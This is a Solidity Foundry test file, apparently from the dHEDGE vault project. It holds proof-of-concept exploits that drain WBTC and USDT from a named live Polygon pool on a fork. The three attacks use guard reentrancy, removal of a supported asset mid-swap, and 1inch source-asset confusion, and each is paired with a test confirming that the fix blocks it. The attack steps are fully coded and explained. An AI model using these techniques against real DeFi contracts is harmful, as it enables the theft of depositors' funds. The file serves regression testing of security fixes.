// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {INonfungiblePositionManager} from "@uniswap/v3-periphery/contracts/interfaces/INonfungiblePositionManager.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";

import {Test} from "forge-std/Test.sol";

import {OneInchV6Guard} from "contracts/guards/contractGuards/OneInchV6Guard.sol";
import {UniswapV3RouterGuard} from "contracts/guards/contractGuards/uniswapV3/UniswapV3RouterGuard.sol";
import {IAggregationRouterV6} from "contracts/interfaces/oneInch/IAggregationRouterV6.sol";
import {IUniswapV2Factory} from "contracts/interfaces/uniswapV2/IUniswapV2Factory.sol";
import {IV3SwapRouter} from "contracts/interfaces/uniswapV3/IV3SwapRouter.sol";
import {IERC20} from "contracts/interfaces/IERC20.sol";
import {Governance} from "contracts/Governance.sol";
import {PoolFactory} from "contracts/PoolFactory.sol";
import {PoolLogic} from "contracts/PoolLogic.sol";
import {PoolManagerLogic} from "contracts/PoolManagerLogic.sol";
import {EthereumConfig} from "test/integration/utils/foundry/config/EthereumConfig.sol";
import {PolygonConfig} from "test/integration/utils/foundry/config/PolygonConfig.sol";

import {FakeERC20ForAssetsConfusion} from "./FakeERC20ForAssetsConfusion.sol";
import {FakeERC20ForOneInchV6Router} from "./FakeERC20ForOneInchV6Router.sol";
import {FakeERC20ForUniV3Router} from "./FakeERC20ForUniV3Router.sol";

contract FakeUniswapV3PoolAttackTest is Test {
  address public constant POOL_TO_DRAIN = 0x6aABe7861FfbCFBE8c6D925971DE2C69A381136d;

  address public constant WETH_USDT_3000_POOL = 0x4CcD010148379ea531D6C587CfDd60180196F9b1;

  function test_drain_wbtc_via_uniswap_guard_reentrancy() public {
    _setUpForkForUniswapGuardReentrancy();

    (bytes memory cd, address maliciousManager, address fakeToken) = _prepareUniswapGuardReentrancyAttack();

    PoolLogic(POOL_TO_DRAIN).execTransaction(PolygonConfig.UNISWAP_V3_ROUTER, cd);

    assertEq(IERC20(PolygonConfig.WBTC).balanceOf(POOL_TO_DRAIN), 0); // Drained
    assertEq(IERC20(PolygonConfig.WETH).balanceOf(POOL_TO_DRAIN), 489);

    assertEq(IERC20(PolygonConfig.WBTC).balanceOf(maliciousManager), 0);

    bytes memory path = abi.encodePacked(PolygonConfig.WBTC, uint24(500), fakeToken);
    IV3SwapRouter.ExactOutputParams memory outputParams = IV3SwapRouter.ExactOutputParams(
      path,
      maliciousManager,
      15.3e8,
      type(uint256).max
    );
    IV3SwapRouter(PolygonConfig.UNISWAP_V3_ROUTER).exactOutput(outputParams);

    assertEq(IERC20(PolygonConfig.WBTC).balanceOf(maliciousManager), 15.3e8);
  }

  function test_revert_drain_wbtc_via_uniswap_guard_reentrancy_after_fix() public {
    _setUpForkForUniswapGuardReentrancy();
    _deployFixedUniswapV3RouterGuard();

    (bytes memory cd, , ) = _prepareUniswapGuardReentrancyAttack();

    // "TF" = "Transfer Failed" - Uniswap V3's error code.
    // Revert chain: UniswapV3RouterGuard.txGuard() reverts with "not pool logic" when FakeERC20ForUniV3Router
    // tries to reenter → FakeERC20ForUniV3Router.transfer() reverts → UniswapV3Pool.swap() catches the failed
    // transfer and reverts with "TF" → bubbles up through exactInput and execTransaction.
    vm.expectRevert(bytes("TF"));
    PoolLogic(POOL_TO_DRAIN).execTransaction(PolygonConfig.UNISWAP_V3_ROUTER, cd);
  }

  function test_drain_wbtc_via_one_inch_by_disabling_src_asset() public {
    _setUpForkForDisableSrcAsset();

    (bytes memory cd, address maliciousManager, address fakeToken) = _prepareOneInchDisableSrcAssetAttack();

    FakeERC20ForOneInchV6Router(fakeToken).attack(POOL_TO_DRAIN, EthereumConfig.ONE_INCH_V6_ROUTER, cd);

    _verifyWbtcDrainedAndExtract(maliciousManager, fakeToken);
  }

  function test_revert_drain_wbtc_via_one_inch_by_disabling_src_asset_after_fix() public {
    _setUpForkForDisableSrcAsset();
    _deployFixedOneInchV6Guard();

    (bytes memory cd, , address fakeToken) = _prepareOneInchDisableSrcAssetAttack();
    // The fakeToken's transfer() calls changeAssets() to remove WBTC from supported assets during the swap.
    // afterTxGuard() then checks if the source asset is still supported and reverts because WBTC was removed.
    vm.expectRevert("unsupported source asset");
    FakeERC20ForOneInchV6Router(fakeToken).attack(POOL_TO_DRAIN, EthereumConfig.ONE_INCH_V6_ROUTER, cd);
  }

  /// @notice PoC: Attempt to use FakeERC20ForOneInchV6Router's attack vector (remove asset mid-swap)
  /// through Uniswap V3 router instead of 1inch. This tests if the asset removal trick works
  /// when using exactInput on Uniswap V3 router.
  function test_drain_wbtc_via_uniswap_by_disabling_src_asset() public {
    _setUpForkForDisableSrcAsset();

    (bytes memory cd, address maliciousManager, address fakeToken) = _prepareUniswapDisableSrcAssetAttack();

    FakeERC20ForOneInchV6Router(fakeToken).attack(POOL_TO_DRAIN, PolygonConfig.UNISWAP_V3_ROUTER, cd);

    _verifyWbtcDrainedAndExtract(maliciousManager, fakeToken);
  }

  function test_revert_drain_wbtc_via_uniswap_by_disabling_src_asset_after_fix() public {
    _setUpForkForDisableSrcAsset();
    _deployFixedUniswapV3RouterGuard();

    (bytes memory cd, , address fakeToken) = _prepareUniswapDisableSrcAssetAttack();

    // The fakeToken's transfer() calls changeAssets() to remove WBTC from supported assets during the swap.
    // afterTxGuard() then checks if the source asset is still supported and reverts because WBTC was removed.
    vm.expectRevert("unsupported source asset");
    FakeERC20ForOneInchV6Router(fakeToken).attack(POOL_TO_DRAIN, PolygonConfig.UNISWAP_V3_ROUTER, cd);
  }

  function test_drain_usdt_via_one_inch_by_src_asset_confusion() public {
    _setUpForkForOneInchAssetConfusion();

    (bytes memory cd, address maliciousManager, address fakeToken) = _prepareOneInchSrcAssetConfusionAttack();
    PoolLogic(POOL_TO_DRAIN).execTransaction(EthereumConfig.ONE_INCH_V6_ROUTER, cd);

    assertEq(IERC20(PolygonConfig.USDT).balanceOf(POOL_TO_DRAIN), 0); // Drained
    assertEq(IERC20(PolygonConfig.WETH).balanceOf(POOL_TO_DRAIN), 25622655366); // Dust amount

    uint256 balanceBefore = IERC20(PolygonConfig.USDT).balanceOf(maliciousManager);

    bytes memory path = abi.encodePacked(PolygonConfig.USDT, uint24(500), fakeToken);
    IV3SwapRouter.ExactOutputParams memory outputParams = IV3SwapRouter.ExactOutputParams(
      path,
      maliciousManager,
      1_355_000e6,
      type(uint256).max
    );
    IV3SwapRouter(PolygonConfig.UNISWAP_V3_ROUTER).exactOutput(outputParams);

    assertEq(IERC20(PolygonConfig.USDT).balanceOf(maliciousManager) - balanceBefore, 1_355_000e6);
  }

  function test_revert_drain_usdt_via_one_inch_by_src_asset_confusion_after_fix() public {
    _setUpForkForOneInchAssetConfusion();
    _deployFixedOneInchV6Guard();

    (bytes memory cd, , ) = _prepareOneInchSrcAssetConfusionAttack();
    vm.expectRevert("direction mismatch");
    PoolLogic(POOL_TO_DRAIN).execTransaction(EthereumConfig.ONE_INCH_V6_ROUTER, cd);
  }

  function _prepareUniswapGuardReentrancyAttack()
    internal
    returns (bytes memory cd, address maliciousManager, address fakeToken)
  {
    uint256 balanceToSteal = IERC20(PolygonConfig.WBTC).balanceOf(POOL_TO_DRAIN);
    assertEq(balanceToSteal, 1534150253); // ~15.3 WBTC

    address uniV3RouterGuard = PoolFactory(PolygonConfig.POOL_FACTORY_PROD).getContractGuard(
      PolygonConfig.UNISWAP_V3_ROUTER
    );
    fakeToken = address(new FakeERC20ForUniV3Router(uniV3RouterGuard));
    (maliciousManager, , ) = _createFakePoolsWithLiquidity(fakeToken);

    bytes memory path = abi.encodePacked(PolygonConfig.WBTC, uint24(500), fakeToken, uint24(500), PolygonConfig.WETH);
    IV3SwapRouter.ExactInputParams memory inputParams = IV3SwapRouter.ExactInputParams(
      path,
      POOL_TO_DRAIN,
      balanceToSteal,
      0
    );
    cd = abi.encodeWithSelector(IV3SwapRouter.exactInput.selector, inputParams);
  }

  function _prepareOneInchDisableSrcAssetAttack()
    internal
    returns (bytes memory cd, address maliciousManager, address fakeToken)
  {
    uint256 balanceToSteal = IERC20(PolygonConfig.WBTC).balanceOf(POOL_TO_DRAIN);
    assertEq(balanceToSteal, 1473585148); // ~14.7 WBTC

    address poolManagerLogic = PoolLogic(POOL_TO_DRAIN).poolManagerLogic();
    fakeToken = address(new FakeERC20ForOneInchV6Router(poolManagerLogic));
    address wbtcFakePool;
    address wethFakePool;
    (maliciousManager, wbtcFakePool, wethFakePool) = _createFakePoolsWithLiquidity(fakeToken);

    uint256 token = uint256(uint160(PolygonConfig.WBTC));

    // 1inch's unoswap2 expects pool addresses packed into uint256 with metadata flags:
    // - Bit 253: Pool type flag. Setting it to 1 tells 1inch this is a UniswapV3 pool.
    // - Bit 247: Swap direction flag. Setting it to 1 tells 1inch to pass zeroForOne=true
    //   to the UniswapV3 pool, meaning swap token0 → token1. If not set, swaps token1 → token0.
    // Since Uniswap sorts tokens by address when creating pools (smaller address = token0),
    // we must check which token ended up as token0 and set the direction flag accordingly.
    bool zeroForOnePool1 = IUniswapV3Pool(wbtcFakePool).token0() == PolygonConfig.WBTC;
    uint256 pool1 = uint256(uint160(wbtcFakePool)) | (uint256(1) << 253);
    if (zeroForOnePool1) {
      pool1 |= uint256(1) << 247;
    }

    bool zeroForOnePool2 = IUniswapV3Pool(wethFakePool).token0() == fakeToken;
    uint256 pool2 = uint256(uint160(wethFakePool)) | (uint256(1) << 253);
    if (zeroForOnePool2) {
      pool2 |= uint256(1) << 247;
    }

    PoolManagerLogic(poolManagerLogic).changeManager(fakeToken, "foo");

    cd = abi.encodeWithSelector(IAggregationRouterV6.unoswap2.selector, token, balanceToSteal, 0, pool1, pool2);
  }

  /// @notice Prepares the attack using FakeERC20ForOneInchV6Router through Uniswap V3 router.
  /// This combines the 1inch attack vector (removing assets mid-swap) with Uniswap V3 exactInput.
  function _prepareUniswapDisableSrcAssetAttack()
    internal
    returns (bytes memory cd, address maliciousManager, address fakeToken)
  {
    uint256 balanceToSteal = IERC20(PolygonConfig.WBTC).balanceOf(POOL_TO_DRAIN);
    assertEq(balanceToSteal, 1473585148); // ~14.7 WBTC

    address poolManagerLogic = PoolLogic(POOL_TO_DRAIN).poolManagerLogic();
    // Use FakeERC20ForOneInchV6Router which removes WBTC from supported assets during transfer
    fakeToken = address(new FakeERC20ForOneInchV6Router(poolManagerLogic));
    (maliciousManager, , ) = _createFakePoolsWithLiquidity(fakeToken);

    // Create exactInput calldata like in test_drain_wbtc_through_uniswap
    // Path: WBTC → fakeToken → WETH
    bytes memory path = abi.encodePacked(PolygonConfig.WBTC, uint24(500), fakeToken, uint24(500), PolygonConfig.WETH);
    IV3SwapRouter.ExactInputParams memory inputParams = IV3SwapRouter.ExactInputParams(
      path,
      POOL_TO_DRAIN,
      balanceToSteal,
      0
    );
    cd = abi.encodeWithSelector(IV3SwapRouter.exactInput.selector, inputParams);

    // Make fakeToken a manager so it can call changeAssets()
    PoolManagerLogic(poolManagerLogic).changeManager(fakeToken, "foo");
  }

  /// @notice This attack exploits the OneInchV6Guard by confusing it about the source asset.
  /// Attack flow:
  /// 1. Create a fake pool (fakeToken/USDT) with fakeToken being very expensive (~141 USDT per fakeToken)
  /// 2. Provide minimal liquidity so swapping 1.35M USDT yields only dust fakeTokens
  /// 3. Pre-seed 1inch router with 100 USDT (0.0001 USDT) to fund the second swap
  /// 4. Call unoswap2 with srcToken=fakeToken but amount=1.35M (the USDT balance to steal)
  /// 5. Guard sees: "swapping fakeToken → WETH" and skips slippage check (fakeToken not supported)
  /// 6. Actual execution: Swap 1 drains 1.35M USDT → dust fakeTokens, Swap 2 uses pre-seeded 100 USDT → dust WETH
  /// 7. Result: Pool lost 1.35M USDT, received dust WETH. Attacker extracts USDT from fakePool later.
  function _prepareOneInchSrcAssetConfusionAttack()
    internal
    returns (bytes memory cd, address maliciousManager, address fakeToken)
  {
    address poolManagerLogic = PoolLogic(POOL_TO_DRAIN).poolManagerLogic();
    maliciousManager = PoolManagerLogic(poolManagerLogic).manager();

    assertTrue(PoolManagerLogic(poolManagerLogic).isSupportedAsset(PolygonConfig.USDT));
    assertTrue(PoolManagerLogic(poolManagerLogic).isSupportedAsset(PolygonConfig.WETH));

    uint256 balanceToSteal = IERC20(PolygonConfig.USDT).balanceOf(POOL_TO_DRAIN);
    assertEq(balanceToSteal, 1357013905782); // ~1,355,000 USDT
    assertEq(IERC20(PolygonConfig.WETH).balanceOf(POOL_TO_DRAIN), 0);

    address oneInchV6ContractGuard = PoolFactory(PolygonConfig.POOL_FACTORY_PROD).getContractGuard(
      EthereumConfig.ONE_INCH_V6_ROUTER
    );
    fakeToken = address(new FakeERC20ForAssetsConfusion(oneInchV6ContractGuard));

    vm.startPrank(maliciousManager);
    address fakePool = IUniswapV3Factory(PolygonConfig.UNISWAP_V3_FACTORY).createPool(
      PolygonConfig.USDT,
      fakeToken,
      500
    );

    deal(PolygonConfig.USDT, maliciousManager, 1e6); // Dealing some dust for liquidity mint
    IERC20(PolygonConfig.USDT).approve(PolygonConfig.UNISWAP_V3_NFT_MANAGER, type(uint256).max);

    assertEq(IUniswapV3Pool(fakePool).token0(), fakeToken);
    assertEq(IUniswapV3Pool(fakePool).token1(), PolygonConfig.USDT);

    // Initialize pool with sqrtPriceX96 = 942089344910633095725413683200
    // This sets price = (sqrtPriceX96 / 2^96)^2 ≈ 141, meaning 1 fakeToken = ~141 USDT.
    // The expensive fakeToken ensures that swapping 1.35M USDT yields only dust fakeTokens,
    // as the pool's tiny liquidity (~100 fakeTokens) gets depleted quickly.
    IUniswapV3Pool(fakePool).initialize(942089344910633095725413683200);

    // Pre-seed 1inch router with dust USDT. This is needed because:
    // - Swap 1 (fakePool): USDT → fakeToken drains all USDT from dhedge pool into fakePool
    // - Swap 2 (real pool): needs USDT input to produce WETH output for dhedge pool
    // The 100 USDT here funds swap 2, producing dust WETH (~25B wei) for the pool.
    IERC20(PolygonConfig.USDT).transfer(EthereumConfig.ONE_INCH_V6_ROUTER, 100);

    // Mint minimal liquidity: 100 fakeTokens + 1 USDT.
    // This tiny liquidity ensures that even 1.35M USDT input produces only ~100 fakeTokens output.
    INonfungiblePositionManager.MintParams memory mintParams = INonfungiblePositionManager.MintParams({
      token0: fakeToken,
      token1: PolygonConfig.USDT,
      fee: 500,
      tickLower: -887220,
      tickUpper: 887220,
      amount0Desired: 100,
      amount1Desired: 1e6,
      amount0Min: 0,
      amount1Min: 0,
      recipient: maliciousManager,
      deadline: type(uint256).max
    });

    INonfungiblePositionManager(PolygonConfig.UNISWAP_V3_NFT_MANAGER).mint(mintParams);

    // 1inch's unoswap2 expects pool addresses packed into uint256 with metadata flags:
    // - Bit 253: Pool type flag. Setting it to 1 tells 1inch this is a UniswapV3 pool.
    // - Bit 247: Swap direction flag. Setting it to 1 tells 1inch to pass zeroForOne=true
    //   to the UniswapV3 pool, meaning swap token0 → token1. If not set, swaps token1 → token0.
    // For dex1 (fakePool): token0=fakeToken, token1=USDT. We want USDT → fakeToken (token1 → token0),
    //   so we set the zeroForOne bit (bit 247).
    // For dex2 (WETH_USDT_3000_POOL): token0=WETH, token1=USDT. We want USDT → WETH (token1 → token0),
    //   so we don't set the zeroForOne bit (bit 247).
    uint256 srcToken = uint256(uint160(fakeToken));
    uint256 dex1 = uint256(uint160(fakePool)) | (uint256(1) << 253);
    assertEq(IUniswapV3Pool(WETH_USDT_3000_POOL).token0(), PolygonConfig.WETH);
    uint256 dex2 = uint256(uint160(WETH_USDT_3000_POOL)) | (uint256(1) << 253);

    // Key trick: srcToken=fakeToken, but amount=balanceToSteal (1.35M USDT).
    // 1inch will call fakeToken.transferFrom(pool, router, 1.35M) which just mints fake tokens.
    // Then it executes swaps where the pools actually pull USDT from dhedge pool.
    // Guard's _retreiveDstToken() traces: fakeToken → fakeToken/USDT pool → USDT → USDT/WETH pool → WETH
    // But since srcToken=fakeToken (not supported), slippage check in updateSlippageImpact() is skipped entirely.
    cd = abi.encodeWithSelector(IAggregationRouterV6.unoswap2.selector, srcToken, balanceToSteal, 0, dex1, dex2);
  }

  /// @notice Verifies that the pool was drained and extracts WBTC from the fake pool.
  /// Used by both test_drain_wbtc_via_one_inch_by_disabling_src_asset and test_drain_wbtc_via_uniswap_by_disabling_src_asset.
  function _verifyWbtcDrainedAndExtract(address maliciousManager, address fakeToken) internal {
    // Verify pool was drained
    assertEq(IERC20(PolygonConfig.WBTC).balanceOf(POOL_TO_DRAIN), 0); // Drained
    assertEq(IERC20(PolygonConfig.WETH).balanceOf(POOL_TO_DRAIN), 489);

    // Extract WBTC from the fake pool
    bytes memory path = abi.encodePacked(PolygonConfig.WBTC, uint24(500), fakeToken);
    IV3SwapRouter.ExactOutputParams memory outputParams = IV3SwapRouter.ExactOutputParams(
      path,
      maliciousManager,
      14.7e8,
      type(uint256).max
    );
    IV3SwapRouter(PolygonConfig.UNISWAP_V3_ROUTER).exactOutput(outputParams);

    assertEq(IERC20(PolygonConfig.WBTC).balanceOf(maliciousManager), 14.7e8);
  }

  function _createFakePoolsWithLiquidity(
    address fakeToken
  ) internal returns (address maliciousManager, address wbtcFakePool, address wethFakePool) {
    address poolManagerLogic = PoolLogic(POOL_TO_DRAIN).poolManagerLogic();
    maliciousManager = PoolManagerLogic(poolManagerLogic).manager();

    assertTrue(PoolManagerLogic(poolManagerLogic).isSupportedAsset(PolygonConfig.WBTC));
    assertTrue(PoolManagerLogic(poolManagerLogic).isSupportedAsset(PolygonConfig.WETH));
    assertEq(IERC20(PolygonConfig.WETH).balanceOf(POOL_TO_DRAIN), 0); // No WETH initially

    vm.startPrank(maliciousManager);

    wbtcFakePool = IUniswapV3Factory(PolygonConfig.UNISWAP_V3_FACTORY).createPool(PolygonConfig.WBTC, fakeToken, 500);
    wethFakePool = IUniswapV3Factory(PolygonConfig.UNISWAP_V3_FACTORY).createPool(PolygonConfig.WETH, fakeToken, 500);

    // Dealing some WETH and WBTC, because it's just dust amounts needed for initializing the pools and providing liquidity.
    deal(PolygonConfig.WBTC, maliciousManager, 1000);
    deal(PolygonConfig.WETH, maliciousManager, 1000);
    // No need to deal fakeToken - fakeToken.transferFrom() doesn't check balances,
    // it simply credits the recipient, effectively minting tokens out of thin air.
    IERC20(PolygonConfig.WBTC).approve(PolygonConfig.UNISWAP_V3_NFT_MANAGER, type(uint256).max);
    IERC20(PolygonConfig.WETH).approve(PolygonConfig.UNISWAP_V3_NFT_MANAGER, type(uint256).max);

    // Initialize pools with sqrtPriceX96 = 2^96, which represents a 1:1 price ratio.
    // sqrtPriceX96 = sqrt(price) * 2^96, so for price = 1: sqrt(1) * 2^96 = 2^96 = 79228162514264337593543950336
    IUniswapV3Pool(wbtcFakePool).initialize(79228162514264337593543950336);
    IUniswapV3Pool(wethFakePool).initialize(79228162514264337593543950336);

    INonfungiblePositionManager.MintParams memory mintParams = INonfungiblePositionManager.MintParams({
      token0: IUniswapV3Pool(wbtcFakePool).token0(),
      token1: IUniswapV3Pool(wbtcFakePool).token1(),
      fee: 500,
      tickLower: -887220,
      tickUpper: 887220,
      amount0Desired: 1000,
      amount1Desired: 1000,
      amount0Min: 0,
      amount1Min: 0,
      recipient: maliciousManager,
      deadline: type(uint256).max
    });

    INonfungiblePositionManager(PolygonConfig.UNISWAP_V3_NFT_MANAGER).mint(mintParams);

    mintParams = INonfungiblePositionManager.MintParams({
      token0: IUniswapV3Pool(wethFakePool).token0(),
      token1: IUniswapV3Pool(wethFakePool).token1(),
      fee: 500,
      tickLower: -887220,
      tickUpper: 887220,
      amount0Desired: 1000,
      amount1Desired: 1000,
      amount0Min: 0,
      amount1Min: 0,
      recipient: maliciousManager,
      deadline: type(uint256).max
    });
    INonfungiblePositionManager(PolygonConfig.UNISWAP_V3_NFT_MANAGER).mint(mintParams);
  }

  function _deployFixedOneInchV6Guard() internal {
    OneInchV6Guard oneInchV6RouterGuard = new OneInchV6Guard(
      PolygonConfig.SLIPPAGE_ACCUMULATOR_PROD,
      IUniswapV2Factory(0x9e5A52f57b3038F1B8EeE45F28b3C1967e22799C),
      IUniswapV3Factory(PolygonConfig.UNISWAP_V3_FACTORY),
      address(0)
    );
    Governance governance = Governance(PoolFactory(PolygonConfig.POOL_FACTORY_PROD).governanceAddress());

    vm.prank(PoolFactory(PolygonConfig.POOL_FACTORY_PROD).owner());
    governance.setContractGuard(EthereumConfig.ONE_INCH_V6_ROUTER, address(oneInchV6RouterGuard));
  }

  function _deployFixedUniswapV3RouterGuard() internal {
    UniswapV3RouterGuard uniswapV3RouterGuard = new UniswapV3RouterGuard(PolygonConfig.SLIPPAGE_ACCUMULATOR_PROD);
    Governance governance = Governance(PoolFactory(PolygonConfig.POOL_FACTORY_PROD).governanceAddress());

    vm.prank(PoolFactory(PolygonConfig.POOL_FACTORY_PROD).owner());
    governance.setContractGuard(PolygonConfig.UNISWAP_V3_ROUTER, address(uniswapV3RouterGuard));
  }

  function _setUpForkForUniswapGuardReentrancy() internal {
    vm.createSelectFork("polygon", 81123395);
  }

  function _setUpForkForDisableSrcAsset() internal {
    vm.createSelectFork("polygon", 81307444);
  }

  function _setUpForkForOneInchAssetConfusion() internal {
    vm.createSelectFork("polygon", 81337939);
  }
}
